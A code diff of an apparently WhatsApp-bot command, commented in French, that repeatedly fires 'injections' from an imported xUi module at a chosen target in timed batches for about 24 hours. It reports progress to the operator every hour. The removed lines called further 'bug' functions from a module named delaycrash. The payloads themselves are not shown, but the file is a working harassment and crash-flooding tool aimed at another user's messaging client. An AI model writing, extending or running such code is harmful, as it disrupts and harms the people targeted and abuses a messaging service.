@@ -1,5 +1,4 @@
 import { xUi } from "../xUi.js"; // ton module xUi intact
-import { test, bug2, bug3 } from "../lib/delaycrash.js"; // <-- import des fonctions exportées
 
 // Fonction de pause
 function sleep(ms) {
@@ -29,12 +28,23 @@ export default {
     const batchSize = 4;        // nombre d'injections par exécution (par batch)
     const intervalMs = 2000;    // pause entre chaque batch (ms)
     const injectionGapMs = 100; // pause entre injections dans un même batch (ms)
-    const totalDurationMs = 24 * 60 * 60 * 1000; // 24h
+
+    // Durée souhaitée (ici 24 heures)
+    const totalDurationMs = 24 * 60 * 60 * 1000; // = 86 400 000 ms
+
+    // Calcul du temps approximatif par batch (injections + interval)
     const perBatchTimeMs = (batchSize * injectionGapMs) + intervalMs;
+
+    // Calcul dynamique du nombre de batches pour atteindre ~24h
     let totalBatches = Math.ceil(totalDurationMs / perBatchTimeMs);
-    const MAX_BATCHES = 200000;
+
+    // Garde-fous : éviter un nombre absurde/illimité (change si tu sais ce que tu fais)
+    const MAX_BATCHES = 200000; // plafond raisonnable (ajuste si besoin)
     if (totalBatches > MAX_BATCHES) totalBatches = MAX_BATCHES;
-    const updateEveryBatches = Math.max(1, Math.floor((60 * 60 * 1000) / perBatchTimeMs)); // ~1h
+
+    // Fréquence d'envoi des messages d'update : on envoie environ toutes les heures
+    const updateEveryBatches = Math.max(1, Math.floor((60 * 60 * 1000) / perBatchTimeMs)); // 1 heure
+
     // ------------------------------------------------
 
     const prosesText = `╔═══════════════════
@@ -45,8 +55,10 @@ export default {
 ║ Durée cible: 24 heures
 ╚═══════════════════`;
 
+    // Image URL à ajouter (initial + final)
     const imageUrl = "https://files.catbox.moe/4185go.jpg";
 
+    // Message initial (avec image + caption)
     await sock.sendMessage(
       m.key.remoteJid,
       {
@@ -57,29 +69,18 @@ export default {
     );
 
     for (let batch = 0; batch < totalBatches; batch++) {
+      // Exécution d'un batch : plusieurs injections rapides
       for (let i = 0; i < batchSize; i++) {
         try {
-          // injection principale (xUi)
-          await xUi(sock, target);
-
-          // appels supplémentaires (bugs)
-          // test: signature (message, sock)
-          await test(m, sock);
-
-          // bug2: signature (message, client, target)
-          await bug2(m, sock, target);
-
-          // bug3: signature (message, client, target)
-          await bug3(m, sock, target);
-
+          await xUi(sock, target); // appel de ta fonction importée
         } catch (err) {
-          console.error(`Erreur Invisxui - batch ${batch + 1} injection ${i + 1}:`, err && err.message ? err.message : err);
+          console.error(`Erreur Invisxui - batch ${batch + 1} injection ${i + 1}:`, err.message || err);
         }
-
         // Petite pause entre injections du même batch pour éviter overlap
         await sleep(injectionGapMs);
       }
 
+      // Message d'update optionnel toutes les X batches (ici ~1 heure)
       if ((batch + 1) % updateEveryBatches === 0) {
         const elapsedBatches = batch + 1;
         const elapsedMs = elapsedBatches * perBatchTimeMs;
@@ -91,6 +92,7 @@ export default {
         );
       }
 
+      // Attendre l'intervalle avant le batch suivant (sauf après le dernier)
       if (batch < totalBatches - 1) {
         await sleep(intervalMs);
       }
@@ -104,6 +106,7 @@ export default {
 ║ Note: Ajuste batchSize/interval si perlu
 ╚═══════════════════`;
 
+    // Message final (avec image + caption)
     await sock.sendMessage(
       m.key.remoteJid,
       {
